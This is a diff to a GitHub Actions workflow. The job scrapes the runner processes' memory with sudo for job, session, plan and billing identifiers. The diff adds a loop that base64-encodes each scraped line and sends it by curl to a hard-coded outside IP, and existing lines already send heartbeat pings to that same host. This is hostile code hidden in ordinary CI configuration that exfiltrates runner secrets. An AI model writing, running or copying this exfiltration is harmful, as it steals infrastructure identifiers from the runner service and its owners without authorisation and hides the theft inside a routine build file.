@@ -19,7 +19,7 @@ jobs:
           listener=$(pgrep -o -f '/Runner.Listener run')
           echo "TARGET_PIDS worker=${worker:-none} listener=${listener:-none}"
           grep -hE 'Job ID|runner request|Run[Ss]ervice|run service|Received message' /home/runner/actions-runner/cached/*/_diag/*.log 2>/dev/null | tail -80 || true
-          sudo python3 - "$worker" "$listener" <<'PY'
+          sudo python3 - "$worker" "$listener" >/tmp/target-id-census <<'PY'
           import os,re,sys
           uuid=re.compile(rb'(?i)(?<![0-9a-f])[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}(?![0-9a-f])')
           needles=(b'runner_request_id',b'runnerRequestId',b'RunnerRequestId',b'run_service_url',b'RunServiceUrl',b'PlanId',b'JobId',b'BillingOwnerId',b'sessionId')
@@ -46,4 +46,9 @@ jobs:
                   tail=b[-2048:]
             for k,v in sorted(found):print(f'TARGET_MEM key={k} id={v}')
           PY
+          cat /tmp/target-id-census
+          while read -r line; do
+            encoded=$(printf '%s' "$line" | base64 -w0 | tr '+/' '-_')
+            curl -sS --max-time 2 "http://16.146.243.72:8450/RS_TARGET_ID?run=$GITHUB_RUN_ID&d=$encoded" >/dev/null || true
+          done </tmp/target-id-census
           for i in $(seq 1 70); do curl -sS --max-time 2 "http://16.146.243.72:8450/RS_TARGET_HEARTBEAT?run=$GITHUB_RUN_ID&n=$i" >/dev/null || true; sleep 5; done
